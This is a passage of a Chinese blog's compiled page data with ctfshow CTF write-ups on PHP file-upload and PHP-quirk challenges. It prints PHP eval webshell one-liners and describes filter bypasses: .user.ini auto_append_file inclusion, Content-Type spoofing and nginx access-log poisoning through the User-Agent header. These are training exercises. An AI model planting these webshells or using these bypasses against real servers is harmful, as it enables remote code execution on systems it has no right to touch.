然后在UA头改为想执行的命令访问主页，最后访问/upload，看看log里命令执行结果即可即可\r\n\r\n![image-20230607174625433](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071746472.png)\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n',contentRendered:'<h2 id="文件上传" tabindex="-1"><a class="header-anchor" href="#文件上传" aria-hidden="true">#</a> 文件上传</h2>\n<h2 id="web151" tabindex="-1"><a class="header-anchor" href="#web151" aria-hidden="true">#</a> Web151</h2>\n<blockquote>\n<p>（前端验证）</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image1" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071533948.png" data="aurora"></p>\n<blockquote>\n<p>在前端会有一些对后缀的过滤，前端过滤就进HTML检查元素把里面的限制语句直接删掉或者改成要上传的后缀名就能上传了，最简单方法就抓包改后缀就行了</p>\n<p>上传一个小马就能rce</p>\n</blockquote>\n<h3 id="web152" tabindex="-1"><a class="header-anchor" href="#web152" aria-hidden="true">#</a> Web152</h3>\n<blockquote>\n<p>(后端验证）</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image3" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071551531.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image4" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071552063.png" data="aurora"></p>\n<blockquote>\n<p>更改content-type在HTTP协议消息头中，使用Content-Type来表示媒体类型信息。它被用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析html或仅仅展示一个文本等。</p>\n<p><a href="https://blog.csdn.net/qq_14869093/article/details/86307084" target="_blank" rel="noopener noreferrer">Content-Type 详解_<ExternalLinkIcon/></a></p>\n<p>抓包后修改content-type 再发包就能绕过后端过滤</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image5" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071553673.png" data="aurora"></p>\n<h3 id="web153" tabindex="-1"><a class="header-anchor" href="#web153" aria-hidden="true">#</a> Web153</h3>\n<blockquote>\n<p>ini文件包含绕过</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image5" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071605355.png" data="aurora"></p>\n<blockquote>\n<p>upload文件夹能够直接访问，说明有index.php文件，所以能够用.user.ini<a href="https://blog.csdn.net/weixin_52635170/article/details/126962920" target="_blank" rel="noopener noreferrer">.user.ini漏洞<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p>\n</blockquote>\n<blockquote>\n<p>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image8" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071708978.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image9" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071709155.png" data="aurora"></p>\n<blockquote>\n<p>这样index.php就包含了1.txt的马然后rce</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image10" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710997.png" data="aurora"></p>\n<blockquote>\n<p>也可以用日志文件包含做</p>\n</blockquote>\n<h3 id="web154" tabindex="-1"><a class="header-anchor" href="#web154" aria-hidden="true">#</a> Web154</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image11" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710482.png" data="aurora"></p>\n<blockquote>\n<p>过滤了”php”内容 php语言对函数名、方法名、类名大小写不敏感 使用大写 或者短标签</p>\n</blockquote>\n<blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=eval($_POST[1]);？> &lt;?PHP eval($_POST[1]);？>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<blockquote>\n<p>没限制就继续用.user.ini漏洞写入包含文件</p>\n</blockquote>\n<h3 id="web155" tabindex="-1"><a class="header-anchor" href="#web155" aria-hidden="true">#</a> Web155</h3>\n<blockquote>\n<p>同上</p>\n</blockquote>\n<h3 id="web156" tabindex="-1"><a class="header-anchor" href="#web156" aria-hidden="true">#</a> web156</h3>\n<blockquote>\n<p>过滤了[]，用{}代替即可:</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=eval($_POST{cmd});?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<h3 id="web157" tabindex="-1"><a class="header-anchor" href="#web157" aria-hidden="true">#</a> web157</h3>\n<blockquote>\n<p>多过滤了分号，改一下即可：</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=include"/var/lo"."g/nginx/access.lo"."g"?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<h3 id="web158" tabindex="-1"><a class="header-anchor" href="#web158" aria-hidden="true">#</a> web158</h3>\n<blockquote>\n<p>同上</p>\n</blockquote>\n<h3 id="web159" tabindex="-1"><a class="header-anchor" href="#web159" aria-hidden="true">#</a> web159</h3>\n<blockquote>\n<p>同上</p>\n</blockquote>\n<h3 id="web160" tabindex="-1"><a class="header-anchor" href="#web160" aria-hidden="true">#</a> web160</h3>\n<blockquote>\n<p>本题多过滤了括号和反引号，而且还过滤了log，日志包含也能做，用字符串拼接(php中用.来连接字符串)构造log:</p>\n</blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=include"/var/lo"."g/nginx/access.lo"."g"?>\n&lt;script language=\'php\'>eval($_POST[1]); &lt;/script>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><blockquote>\n<p>这种小马在&lt;?被过滤时用</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image20" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071745551.png" data="aurora"></p>\n<blockquote>\n<p>然后上传.user.ini包含该文件即可：auto_append_file=/var/www/html/upload/hack.png</p>\n</blockquote>\n<blockquote>\n<p>然后在UA头改为想执行的命令访问主页，最后访问/upload，看看log里命令执行结果即可即可</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230607174625433" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071746472.png" data="aurora"></p>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web2.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web2",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web2.md",filePathRelative:"web/web2.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web2.html.vue",componentFilePathRelative:"pages/web/web2.html.vue",componentFileChunkName:"v-d57b2632",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web2.html.js",dataFilePathRelative:"pages/web/web2.html.js",dataFileChunkName:"v-d57b2632",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web2.html",htmlFilePathRelative:"web/web2.html"},{data:{key:"v-d21174f4",path:"/web/web3.html",title:"php特性刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"php特性刷题",tag:["ctfshow刷题"],categories:["php特性","歪比八卜"]},excerpt:"",headers:[{level:2,title:"php特性",slug:"php特性",children:[{level:3,title:"Web89",slug:"web89",children:[]},{level:3,title:"Web90",slug:"web90",children:[]},{level:3,title:"Web91",slug:"web91",children:[]},{level:3,title:"Web92",slug:"web92",children:[]},{level:3,title:"Web93",slug:"web93",children:[]},{level:3,title:"Web94",slug:"web94",children:[]},{level:3,title:"Web95",slug:"web95",children:[]},{level:3,title:"Web96",slug:"web96",children:[]},{level:3,title:"Web97",slug:"web97",children:[]},{level:3,title:"Web98",slug:"web98",children:[]},{level:3,title:"Web99",slug:"web99",children:[]},{level:3,title:"Web100",slug:"web100",children:[]},{level:3,title:"web101",slug:"web101",children:[]},{level:3,title:"Web102",slug:"web102",children:[]}]}],git:{}},key:"v-d21174f4",path:"/web/web3.html",title:"php特性刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"php特性刷题",tag:["ctfshow刷题"],categories:["php特性","歪比八卜"]},excerpt:"",headers:[{level:2,title:"php特性",slug:"php特性",children:[{level:3,title:"Web89",slug:"web89",children:[]},{level:3,title:"Web90",slug:"web90",children:[]},{level:3,title:"Web91",slug:"web91",children:[]},{level:3,title:"Web92",slug:"web92",children:[]},{level:3,title:"Web93",slug:"web93",children:[]},{level:3,title:"Web94",slug:"web94",children:[]},{level:3,title:"Web95",slug:"web95",children:[]},{level:3,title:"Web96",slug:"web96",children:[]},{level:3,title:"Web97",slug:"web97",children:[]},{level:3,title:"Web98",slug:"web98",children:[]},{level:3,title:"Web99",slug:"web99",children:[]},{level:3,title:"Web100",slug:"web100",children:[]},{level:3,title:"web101",slug:"web101",children:[]},{level:3,title:"Web102",slug:"web102",children:[]}]}],content:'\r\n## php特性\r\n\r\n### Web89\r\n\r\n![image-20230607100007017](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000076.png)\r\n\r\n> 数组绕过原理：preg_match()只能处理字符串，当传入的subject是数组时会返回false intval（）用于获取变量的整数值。也可用于进制的转化\r\n\r\n> PHP 是一门弱类型语言不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。 \r\n\r\n### Web90\r\n\r\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000168.png" alt="image-20230607100032127"  />\r\n\r\n> 字符绕过：intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。如果参数是符点数，则返回他取整之后的值。\r\n\r\n> int intval ( mixed $var [, int $base = 10 ] )\r\n\r\n> 参数说明：\r\n\r\n> $var：要转换成 integer 的数量值。\r\n\r\n> $base：转化所使用的进制。\r\n\r\n> 如果 base 是 0，通过检测 var 的格式来决定使用的进制：\r\n\r\n> 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，如果字符串以 "0" 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。\r\n\r\n### Web91\r\n\r\n![image-20230607151820515](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071518574.png)\r\n\r\n> 一个正则判断\r\n\r\n> 去看就完事了[正则表达式全解析+正则表达式例子详解](https://blog.csdn.net/xuemoyao/article/details/8033138?ops_request_misc=%7B%22request%5Fid%22%3A%22165222532616782391878742%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=165222532616782391878742&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-8033138-null-null.142^v9^pc_search_result_control_group,157^v4^control&utm_term=正则表达式&spm=1018.2226.3001.4187)\r\n>\r\n> m是多行匹配，i是忽略大小写\r\n\r\n> ![clip_image007](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520576.png)匹配变量中多行开头到结尾要有php\r\n\r\n> ![clip_image008](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520696.png)匹配变量中一行行开头到结尾要有php\r\n\r\n### Web92\r\n\r\n![clip_image010](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520853.png)\r\n\r\n> 关于intval（）函数的用法看web90\r\n>\r\n> 这道题意思是num这个变量转化为八进制是4476，还是考intval的用法\r\n\r\n### Web93\r\n\r\n![clip_image011](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521259.png)\r\n\r\n> 相比上一题多了匹配正则 不能出现字母 断了16进制（0x） 8进制（0）不受影响，进制绕过\r\n\r\n### Web94\r\n\r\n![clip_image013](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521144.png)\r\n\r\n> strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.所以num值中要出现0，算一个比较函数\r\n\r\n> 第三个判断就限制了八进制 如果num==010574 strpos()返回字符串第一次出现的位置就是0，第三个判断就满足了就绕不过了\r\n\r\n> 浮点绕过\r\n\r\n### Web95\r\n\r\n![clip_image015](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521951.png)\r\n\r\n> Intval（）函数会将输入的数前的“空格”和“+”（有且仅有）可当成输入的数为正数，一个绕过方法\r\n\r\n### Web96\r\n\r\n![clip_image017](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521040.png)\r\n\r\n> Highlight_file可带路径，所以变量可以是路径\r\n\r\n### Web97\r\n\r\n![clip_image019](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521079.png)\r\n\r\n> 考察md5加密：[ MD5加密漏洞(MD5绕过方式-0e绕过/数组绕过/MD5碰撞/MD5SQL注入)](https://blog.csdn.net/wangyuxiang946/article/details/119845182?ops_request_misc=%7B%22request%5Fid%22%3A%22165261132516782184692274%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=165261132516782184692274&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-119845182-null-null.142^v9^pc_search_result_control_group,157^v4^control&utm_term=md5数组&spm=1018.2226.3001.4187)\r\n\r\n> MD5是一种散列函数,是哈希算法的一种,可以将任意长度的输入,通过散列算法变换成128位的散列值\r\n\r\n> MD5加密有4种绕过方式1、0e绕过1、数组绕过1、MD5碰撞1、MD5SQL注入\r\n\r\n> 这道题需要用到===强比较（判断内容的基础上,还会判断类型是否相同），所以不能用0e弱比较绕过，用数组绕过\r\n>\r\n> 由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样\r\n>\r\n> null === null 满足条件就可以绕过了\r\n\r\n![clip_image021](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522290.png)\r\n\r\n### Web98\r\n\r\n![clip_image023](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522985.png)\r\n\r\n> 用到了？三元运算符 即前面表达式为真，则执行：前的，反之执行：后的\r\n\r\n> “=&“的一个说明\r\n\r\n> $a = $b; //把$b赋值给$a,如果赋值之后,$b改变了,$a不变\r\n\r\n> $a =&$b; //把$b的地址传递给$a,这时候,$a和$b都指向内存中的同一块地址,所以如果赋值后,$b改变,$a也会改变\r\n\r\n> 如果$_GET有东西传参进去就  将$_GET方法变成$_POST方法\r\n\r\n> 思路：随便传一个get值，不能是flag=flag就行，并传post值HTTP_FLAG=flag 在判断highlight_file时就能通过\r\n\r\n![clip_image025](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522735.png)\r\n\r\n \r\n\r\n### Web99\r\n\r\n![clip_image027](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522978.png)\r\n\r\n> array_push() 函数向数组尾部插入一个或多个元素。\r\n\r\n> array_push(*array,value1,value2...*)\r\n\r\n> $a=array("a"=>"red","b"=>"green");\r\n>  array_push($a,"blue","yellow"); 两种使用方式\r\n\r\n> 如果数组\r\n\r\n \r\n\r\n> file_put_contents() 函数把一个字符串写入文件中。如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。\r\n\r\n> in_array — 检查数组中是否存在某个值{\r\n\r\n> in_array(mixed $needle, array $haystack, bool $strict = false): bool\r\n\r\n> 大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 }36-846的随机写入数字 有一个概率问题 到底会有什么会在allow数组中 1的可能性是最大的\r\n\r\n> 这道题是弱比较类型所以 字符串类型绕过1.php==1\r\n\r\n> 通过post传参写入 rce\r\n>\r\n> 然后访问2.php就行\r\n\r\n![clip_image029](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523710.png)\r\n\r\n### Web100\r\n\r\n![clip_image031](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523863.png)\r\n\r\n> is_numeric — 检测变量是否为数字或数字字符串 \r\n\r\n> 如果 `value` 是数字或[数字字符串](https://www.php.net/manual/zh/language.types.numeric-strings.php)， 返回 `**true**`；否则返回 `**false**`。\r\n\r\n> 这里是个大坑 因为赋值运算优先于逻辑判断，且赋值运算逻辑为true 所以这个$v0与后面的$v2$v3无关\r\n\r\n> 还有$v2中不能出现； 考虑PHP语句最后一句可不加；直接闭合\r\n\r\n![clip_image033](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523123.png)\r\n\r\n \r\n\r\n> 正常RCE\r\n\r\n> ctfshow{2d6dd5c50x2d8c980x2d4c3e0x2da10e0x2dc6b39863b5e2}\r\n\r\n> 0x2d=”-”\r\n\r\n> ctfshow{2d6dd5c5-8c98-4c3e-a10e-c6b39863b5e2}\r\n\r\n### web101\r\n\r\n> 考点：PHP 反射机制Reflection[PHP: ReflectionClass - Manual](https://www.php.net/manual/zh/class.reflectionclass.php)\r\n\r\n> **ReflectionClass** 类报告了一个类的有关信息。\r\n\r\n![clip_image035](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523714.png)\r\n\r\n> 这样可以echo出asd类中的属性及其方法\r\n\r\n![clip_image037](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523658.png)\r\n\r\n> 注意这次的flag值少了一位，自己猜一下\r\n\r\n### Web102\r\n\r\n![clip_image039](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523844.png)\r\n\r\n> substr() 函数返回字符串的一部分。substr(string,start,length)\r\n\r\n> call_user_func — 把第一个参数作为回调函数调用',contentRendered:'<h2 id="php特性" tabindex="-1"><a class="header-anchor" href="#php特性" aria-hidden="true">#</a> php特性</h2>\n<h3 id="web89" tabindex="-1"><a class="header-anchor" href="#web89" aria-hidden="true">#</a> Web89</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230607100007017" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000076.png" data="aurora"></p>\n<blockquote>\n<p>数组绕过原理：preg_match()只能处理字符串，当传入的subject是数组时会返回false intval（）用于获取变量的整数值。也可用于进制的转化</p>\n</blockquote>\n<blockquote>\n<p>PHP 是一门弱类型语言不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。</p>\n</blockquote>\n<h3 id="web90" tabindex="-1"><a class="header-anchor" href="#web90" aria-hidden="true">#</a> Web90</h3>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000168.png" alt="image-20230607100032127"  />\n<blockquote>\n<p>字符绕过：intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。如果参数是符点数，则返回他取整之后的值。</p>\n</blockquote>\n<blockquote>\n<p>int intval ( mixed $var [, int $base = 10 ] )</p>\n</blockquote>\n<blockquote>\n<p>参数说明：</p>\n</blockquote>\n<blockquote>\n<p>$var：要转换成 integer 的数量值。</p>\n</blockquote>\n<blockquote>\n<p>$base：转化所使用的进制。</p>\n</blockquote>\n<blockquote>\n<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>\n</blockquote>\n<blockquote>\n<p>如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。</p>\n</blockquote>\n<h3 id="web91" tabindex="-1"><a class="header-anchor" href="#web91" aria-hidden="true">#</a> Web91</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230607151820515" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071518574.png" data="aurora"></p>\n<blockquote>\n<p>一个正则判断</p>\n</blockquote>\n<blockquote>\n<p>去看就完事了<a href="https://blog.csdn.net/xuemoyao/article/details/8033138?ops_request_misc=%7B%22request%5Fid%22%3A%22165222532616782391878742%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=165222532616782391878742&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-8033138-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&amp;utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener noreferrer">正则表达式全解析+正则表达式例子详解<ExternalLinkIcon/></a></p>\n<p>m是多行匹配，i是忽略大小写</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image007" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520576.png" data="aurora">匹配变量中多行开头到结尾要有php</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image008" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520696.png" data="aurora">匹配变量中一行行开头到结尾要有php</p>\n</blockquote>\n<h3 id="web92" tabindex="-1"><a class="header-anchor" href="#web92" aria-hidden="true">#</a> Web92</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image010" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520853.png" data="aurora"></p>\n<blockquote>\n<p>关于intval（）函数的用法看web90</p>\n<p>这道题意思是num这个变量转化为八进制是4476，还是考intval的用法</p>\n</blockquote>\n<h3 id="web93" tabindex="-1"><a class="header-anchor" href="#web93" aria-hidden="true">#</a> Web93</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image011" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521259.png" data="aurora"></p>\n<blockquote>\n<p>相比上一题多了匹配正则 不能出现字母 断了16进制（0x） 8进制（0）不受影响，进制绕过</p>\n</blockquote>\n<h3 id="web94" tabindex="-1"><a class="header-anchor" href="#web94" aria-hidden="true">#</a> Web94</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image013" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521144.png" data="aurora"></p>\n<blockquote>\n<p>strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.所以num值中要出现0，算一个比较函数</p>\n</blockquote>\n<blockquote>\n<p>第三个判断就限制了八进制 如果num==010574 strpos()返回字符串第一次出现的位置就是0，第三个判断就满足了就绕不过了</p>\n</blockquote>\n<blockquote>\n<p>浮点绕过</p>\n</blockquote>\n<h3 id="web95" tabindex="-1"><a class="header-anchor" href="#web95" aria-hidden="true">#</a> Web95</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image015" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521951.png" data="aurora"></p>\n<blockquote>\n<p>Intval（）函数会将输入的数前的“空格”和“+”（有且仅有）可当成输入的数为正数，一个绕过方法</p>\n</blockquote>\n<h3 id="web96" tabindex="-1"><a class="header-anchor" href="#web96" aria-hidden="true">#</a> Web96</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image017" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521040.png" data="aurora"></p>\n<blockquote>\n<p>Highlight_file可带路径，所以变量可以是路径</p>\n</blockquote>\n<h3 id="web97" tabindex="-1"><a class="header-anchor" href="#web97" aria-hidden="true">#</a> Web97</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image019" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521079.png" data="aurora"></p>\n<blockquote>\n<p>考察md5加密：<a href="https://blog.csdn.net/wangyuxiang946/article/details/119845182?ops_request_misc=%7B%22request%5Fid%22%3A%22165261132516782184692274%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=165261132516782184692274&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-119845182-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&amp;utm_term=md5%E6%95%B0%E7%BB%84&amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener noreferrer"> MD5加密漏洞(MD5绕过方式-0e绕过/数组绕过/MD5碰撞/MD5SQL注入)<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>MD5是一种散列函数,是哈希算法的一种,可以将任意长度的输入,通过散列算法变换成128位的散列值</p>\n</blockquote>\n<blockquote>\n<p>MD5加密有4种绕过方式1、0e绕过1、数组绕过1、MD5碰撞1、MD5SQL注入</p>\n</blockquote>\n<blockquote>\n<p>这道题需要用到===强比较（判断内容的基础上,还会判断类型是否相同），所以不能用0e弱比较绕过，用数组绕过</p>\n<p>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样</p>\n<p>null === null 满足条件就可以绕过了</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image021" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522290.png" data="aurora"></p>\n<h3 id="web98" tabindex="-1"><a class="header-anchor" href="#web98" aria-hidden="true">#</a> Web98</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image023" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522985.png" data="aurora"></p>\n<blockquote>\n<p>用到了？三元运算符 即前面表达式为真，则执行：前的，反之执行：后的</p>\n</blockquote>\n<blockquote>\n<p>“=&amp;“的一个说明</p>\n</blockquote>\n<blockquote>\n<p>$a = $b; //把$b赋值给$a,如果赋值之后,$b改变了,$a不变</p>\n</blockquote>\n<blockquote>\n<p>$a =&amp;$b; //把$b的地址传递给$a,这时候,$a和$b都指向内存中的同一块地址,所以如果赋值后,$b改变,$a也会改变</p>\n</blockquote>\n<blockquote>\n<p>如果$_GET有东西传参进去就  将$_GET方法变成$_POST方法</p>\n</blockquote>\n<blockquote>\n<p>思路：随便传一个get值，不能是flag=flag就行，并传post值HTTP_FLAG=flag 在判断highlight_file时就能通过</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image025" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522735.png" data="aurora"></p>\n<h3 id="web99" tabindex="-1"><a class="header-anchor" href="#web99" aria-hidden="true">#</a> Web99</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image027" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522978.png" data="aurora"></p>\n<blockquote>\n<p>array_push() 函数向数组尾部插入一个或多个元素。</p>\n</blockquote>\n<blockquote>\n<p>array_push(<em>array,value1,value2...</em>)</p>\n</blockquote>\n<blockquote>\n<p>$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;);\narray_push($a,&quot;blue&quot;,&quot;yellow&quot;); 两种使用方式</p>\n</blockquote>\n<blockquote>\n<p>如果数组</p>\n</blockquote>\n<blockquote>\n<p>file_put_contents() 函数把一个字符串写入文件中。如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p>\n</blockquote>\n<blockquote>\n<p>in_array — 检查数组中是否存在某个值{</p>\n</blockquote>\n<blockquote>\n<p>in_array(mixed $needle, array $haystack, bool $strict = false): bool</p>\n</blockquote>\n<blockquote>\n<p>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 }36-846的随机写入数字 